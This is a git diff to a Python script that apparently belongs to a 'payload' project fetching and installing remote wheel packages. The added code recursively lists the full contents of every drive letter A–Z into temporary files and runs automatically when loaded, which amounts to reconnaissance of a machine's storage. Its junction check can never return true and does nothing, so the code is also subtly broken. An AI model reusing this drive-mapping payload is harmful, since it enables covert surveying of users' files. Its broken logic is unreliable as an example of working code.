@@ -4,6 +4,8 @@ import subprocess
 import os
 import tempfile
 import importlib.util
+import string
+import argparse
 
 def is_python_installed():
     try:
@@ -61,5 +63,46 @@ def download_and_install_whl(url, filename):
     except Exception as e:
         print(f"Error downloading or installing whl: {e}")
 
+def is_junction(path):
+    if os.path.isdir(path) and not os.path.exists(path):
+        return True
+    return False
+
+def tree(directory, file, prefix=''):
+    try:
+        files = os.listdir(directory)
+    except PermissionError:
+        return
+
+    files.sort()
+    contents = [(f, os.path.isdir(os.path.join(directory, f))) for f in files]
+
+    for index, (name, is_dir) in enumerate(contents):
+        path = os.path.join(directory, name)
+        
+        if is_junction(path):
+            continue
+        
+        if is_dir:
+            connector = '├── ' if index < len(contents) - 1 else '└── '
+            file.write(prefix + connector + name + '/\n')
+            extension = '│   ' if index < len(contents) - 1 else '    '
+            tree(path, file, prefix + extension)
+        else:
+            connector = '├── ' if index < len(contents) - 1 else '└── '
+            file.write(prefix + connector + name + '\n')
+
+def scan_usb():
+    maj_letters = list(string.ascii_uppercase)
+    for maj_letters in maj_letters:
+        letterpath = str(maj_letters) + ":\\"
+        if os.path.isdir(letterpath):
+            with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
+                tree(letterpath, temp_file)
+                temp_file_path = temp_file.name
+            print(f"{letterpath} : {temp_file_path}")
+
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
+
+scan_usb()
